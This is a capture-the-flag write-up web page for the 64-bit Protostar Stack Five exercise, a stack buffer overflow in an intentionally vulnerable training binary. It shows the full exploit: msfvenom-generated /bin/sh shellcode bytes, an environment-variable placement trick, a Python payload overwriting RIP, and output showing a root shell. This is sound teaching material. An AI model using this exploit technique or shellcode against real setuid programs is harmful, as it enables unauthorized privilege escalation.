<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>#Protostar x64 - Stack Five</strong></h1>
        <a href="https://exploit.education/protostar/stack-five/">https://exploit.education/protostar/stack-five/</a><br>
        NOTE 1: Protostar doesn't offer 64-bit versions of the challenges itself. I set it up myself. For setup, refer <a href="../vm-setup/vm-setup.html">here</a><br>
        NOTE 2: I'm writing the 64-bit write-ups as follow-ups to the 32-bit challenges, so I won't be going over the intricacies of the exploit, just the differences involved with it now being a 64-bit challenge instead of 32-bit<br>
        <br>
        <img alt="images\7-1.png" src="images/7-1.png"><br>
        <br>
        The goal of Stack Five is to overflow the <code>buffer</code> variable, drop shellcode to the stack and overwrite RIP to jump to our shellcode, resulting in a shell.<br>
        <br>
        <a id="h3-1" name="h3-1"></a><strong></strong>
        <h3><strong>Info - Drop shellcode to the stack</strong></h3><br>
        There are 3 ways to drop shellcode to the stack:<br>
        • Write shellcode within buffer<br>
        • Write shellcode after buffer<br>
        • Write shellcode into environment variable<br>
        <br>
        I had trouble with the first two, so in this challenge I wrote my shellcode to an evnvironment variable and jumped to it.<br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>1) Find offset to RIP</strong></h2><br>
        First, find the offset to overwrite RIP.<br>
        <br>
        Create a cyclic pattern with <code>msf-pattern_create</code>, open the binary in GDB and submit the pattern.<br>
        Examine the value in RSP to find the cyclic pattern that will overwrite RIP.<br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;gdb&nbsp;-q&nbsp;stack5<br>
                Reading&nbsp;symbols&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack5...<span style="color:#ff9d00;font-weight:700">(</span>no&nbsp;debugging&nbsp;symbols&nbsp;found<span style="color:#ff9d00;font-weight:700">)</span>...done.<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run<br>
                Starting&nbsp;program<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>protostar64<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack5&nbsp;<br>
                Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A<br>
                <br>
                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
                0x0000000000400510&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ffdd00;font-weight:400">main&nbsp;()</span><br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;x<span style="color:#ff9d00;font-weight:700">/</span>xg&nbsp;<span style="color:#7f0044;font-weight:400">$rsp</span><br>
                0x7fffffffe4e8<span style="color:#ff9d00;font-weight:700">:</span> 0x6341356341346341
            </div>
        </div><br>
        <br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar-x64]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_offset&nbsp;-q&nbsp;0x6341356341346341</span><br>
                [*]&nbsp;Exact&nbsp;match&nbsp;at&nbsp;offset&nbsp;72
            </div>
        </div><br>
        <br>
        <a id="h2-2" name="h2-2"></a><strong></strong>
        <h2><strong>2) Create shellcode and environment variable</strong></h2><br>
        Use <code>msfvenom</code> to generate some shellcode.<br>
        Null bytes - <code>0x00</code>, new lines - <code>0x0a</code>, and carriage returns - <code>0x0d</code>, will cause errors so mark those as bad characters.<br>
        <br>
            <div class="codebox">
                root@fumble<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;msfvenom&nbsp;-p&nbsp;linux<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>exec&nbsp;CMD=<span style="color:#3ad900;font-weight:400">"/bin/sh"</span>&nbsp;-f&nbsp;python&nbsp;-v&nbsp;shellcode&nbsp;-b&nbsp;<span style="color:#3ad900;font-weight:400">"\x00\x0a\x0d"</span><br>
                [...]<br>
                Attempting&nbsp;to&nbsp;encode&nbsp;payload&nbsp;with&nbsp;1&nbsp;iterations&nbsp;of&nbsp;x64<span style="color:#ff9d00;font-weight:700">/</span>xor<br>
                x64<span style="color:#ff9d00;font-weight:700">/</span>xor&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;87&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>iteration=0<span style="color:#ff9d00;font-weight:700">)</span><br>
                x64<span style="color:#ff9d00;font-weight:700">/</span>xor&nbsp;chosen&nbsp;with&nbsp;final&nbsp;size&nbsp;87<br>
                Payload&nbsp;size<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;87&nbsp;bytes<br>
                Final&nbsp;size&nbsp;of&nbsp;python&nbsp;<span style="color:#ff9d00;font-weight:700">file:</span>&nbsp;501&nbsp;bytes<br>
                shellcode&nbsp;=&nbsp;&nbsp;b<span style="color:#3ad900;font-weight:400">""</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x8d\x05\xef\xff\xff\xff\x48\xbb\x10\x24\xd8"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6b\xf5\x07\x15\x6a\x48\x31\x58\x27\x48\x2d"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\xf8\xff\xff\xff\xe2\xf4\x7a\x1f\x80\xf2\xbd"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\xbc\x3a\x08\x79\x4a\xf7\x18\x9d\x07\x46\x22"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x99\xc3\xb0\x46\x96\x07\x15\x22\x99\xc2\x8a"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x83\xfd\x07\x15\x6a\x3f\x46\xb1\x05\xda\x74"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x7d\x6a\x46\x73\x90\xe2\x13\x08\x10\x6a"</span>
            </div>
        </div><br>
        <br>
        Create a python file to print out the payload.<br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;msfvenom&nbsp;-p&nbsp;linux/x64/exec&nbsp;CMD="/bin/sh"&nbsp;-f&nbsp;python&nbsp;-v&nbsp;shellcode&nbsp;-b&nbsp;"\x00\x0a\x0d"</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;Payload&nbsp;size:&nbsp;87&nbsp;bytes</span><br>
                shellcode&nbsp;=&nbsp;&nbsp;b<span style="color:#3ad900;font-weight:400">""</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x8d\x05\xef\xff\xff\xff\x48\xbb\x10\x24\xd8"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6b\xf5\x07\x15\x6a\x48\x31\x58\x27\x48\x2d"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\xf8\xff\xff\xff\xe2\xf4\x7a\x1f\x80\xf2\xbd"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\xbc\x3a\x08\x79\x4a\xf7\x18\x9d\x07\x46\x22"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x99\xc3\xb0\x46\x96\x07\x15\x22\x99\xc2\x8a"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x83\xfd\x07\x15\x6a\x3f\x46\xb1\x05\xda\x74"</span><br>
                shellcode&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x7d\x6a\x46\x73\x90\xe2\x13\x08\x10\x6a"</span><br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;shellcode
            </div>
        </div><br>
        <br>
        Use <code>export</code> to set the PWN environment variable to store our shellcode.<br>
        The backticks - <code>`</code> - execute the code inside them (in this case, execute the python script and take the output as the environment variable)<br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;<span style="color:#ff9d00;font-weight:700">export</span>&nbsp;<span style="color:#7f0044;font-weight:400">PWN</span>=<span style="color:#333333;font-weight:400">`python&nbsp;stack5-shellcode.py`</span><br>
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#7f0044;font-weight:400">$PWN</span><br>
                H1�H������H�����H�$�k�jH1X<span style="color:#3ad900;font-weight:400">'H-������z��yJ��F"�ðF�"���j?F��t}jFs�j</span>
            </div>
        </div><br>
        <br>
        <a id="h2-3" name="h2-3"></a><strong></strong>
        <h2><strong>3) Find address of PWN environment variable</strong></h2><br>
        We need to know the address of the PWN environment variable so that we can jump to it.<br>
        <br>
        For this, you can use the <code>getenvaddr</code> binary (part of Hacking: The Art of Exploitation) found here - <a href="https://github.com/historypeats/getenvaddr">https://github.com/historypeats/getenvaddr</a><br>
        <br>
        Create and compile <code>getenvaddr</code> binary.<br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;nano&nbsp;getenvaddr.c<br>
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;<span style="color:#ff9d00;font-weight:700">gcc</span>&nbsp;getenvaddr.c&nbsp;-o&nbsp;getenvaddr<br>
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;+x&nbsp;getenvaddr
            </div>
        </div><br>
        <br>
        Run <code>getenvaddr</code>.<br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>getenvaddr&nbsp;PWN&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack5<br>
                PWN&nbsp;will&nbsp;be&nbsp;at&nbsp;0x7fffffffeeee
            </div>
        </div><br>
        <br>
        On my target machine, the PWN environment variable is at address <code>0x7fffffffeeee</code>.<br>
        <br>
        <a id="h2-4" name="h2-4"></a><strong></strong>
        <h2><strong>4) Write Exploit</strong></h2><br>
        At this point, we have everything we need to write the exploit script.<br>
        <br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Protostar&nbsp;x64&nbsp;-&nbsp;Stack&nbsp;Five</span><br>
                <br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">72</span><br>
                PWN_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x7fffffffeeee</span>)<br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>&nbsp;*&nbsp;<span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overflow&nbsp;buffer</span><br>
                payload&nbsp;+=&nbsp;PWN_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP&nbsp;&amp;&nbsp;jump&nbsp;to&nbsp;PWN&nbsp;environment&nbsp;variable</span><br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
            </div>
        </div><br>
        <br>
        <a id="h2-5" name="h2-5"></a><strong></strong>
        <h2><strong>5) Win</strong></h2><br>
        To keep the spawned shell open to allow us to input commands, use <code>cat</code>.<br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>python&nbsp;stack5.py<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cat)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack5<br>
                <span style="color:#ff9d00;font-weight:700">id</span><br>
                <span style="color:#7f0044;font-weight:400">uid</span>=1000<span style="color:#ff9d00;font-weight:700">(</span>user<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=1000<span style="color:#ff9d00;font-weight:700">(</span>user<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;euid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;egid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>,4<span style="color:#ff9d00;font-weight:700">(</span>adm<span style="color:#ff9d00;font-weight:700">)</span>,24<span style="color:#ff9d00;font-weight:700">(</span>cdrom<span style="color:#ff9d00;font-weight:700">)</span>,27<span style="color:#ff9d00;font-weight:700">(sudo)</span>,30<span style="color:#ff9d00;font-weight:700">(</span>dip<span style="color:#ff9d00;font-weight:700">)</span>,46<span style="color:#ff9d00;font-weight:700">(</span>plugdev<span style="color:#ff9d00;font-weight:700">)</span>,109<span style="color:#ff9d00;font-weight:700">(</span>lpadmin<span style="color:#ff9d00;font-weight:700">)</span>,124<span style="color:#ff9d00;font-weight:700">(</span>sambashare<span style="color:#ff9d00;font-weight:700">)</span>,1000<span style="color:#ff9d00;font-weight:700">(</span>user<span style="color:#ff9d00;font-weight:700">)</span><br>
                <span style="color:#ff9d00;font-weight:700">whoami</span><br>
                root
            </div>
        </div>
    </writeup>
</section>

</body>
</html>